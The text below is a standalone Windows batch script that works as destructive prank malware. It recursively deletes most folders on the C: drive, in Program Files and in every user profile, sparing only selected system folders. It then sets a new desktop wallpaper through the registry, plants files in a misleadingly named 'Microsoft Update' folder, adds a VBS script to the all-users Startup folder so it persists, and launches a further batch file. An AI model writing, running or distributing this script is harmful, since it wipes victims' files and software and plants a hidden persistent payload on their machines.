c:
cd /
for /D %%I in (*) do if /I not "%%I"=="Windows" if /I not "%%I"=="Users" if /I not "%%I"=="Program Files (x86)" if /I not "%%I"=="Program Files" del /s /q "%%I"
cd C:/"Program Files (x86)"
for /D %%I in (*) do if /I not "%%I"=="Common Files" if /I not "%%I"=="Microsoft" if /I not "%%I"=="Microsoft.NET" if /I not "%%I"=="Windows Defender" if /I not "%%I"=="Windows Mail" if /I not "%%I"=="Windows Media Player" if /I not "%%I"=="Windows NT" if /I not "%%I"=="Windows Photo Viewer" if /I not "%%I"=="WindowsPowerShell" del /s /q "%%I"
cd C:/"Program Files"
for /D %%I in (*) do if /I not "%%I"=="Common Files" if /I not "%%I"=="Windows Defender" if /I not "%%I"=="Windows Mail" if /I not "%%I"=="Windows Media Player" if /I not "%%I"=="Windows NT" if /I not "%%I"=="Windows Photo Viewer" if /I not "%%I"=="WindowsPowerShell" del /s /q "%%I"
cd C:/Users/%username%
for /D %%A in (*) do (
    cd "%%A"
    del * /s /q | for /D %%p IN (*) DO rmdir "%%p" /s /q
    cd ..
)
set "wallpaperPath=thumboi.png"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaperPath%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
cd C:/Users/%username/AppData/Local
mkdir "Microsoft Update"
copy funnyahhaudio.wav "C:/Users/%username%/AppData/Local/Microsoft Update"
copy audio.bat "C:/Users/%username%/AppData/Local/Microsoft Update"
copy hehe.vbs "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup"
copy thumboi.png C:/Users/%username%/Downloads
copy thumb.bat C:/Users/%username%/Downloads
cd C:/Users/%username%/Downloads
start thumb.bat

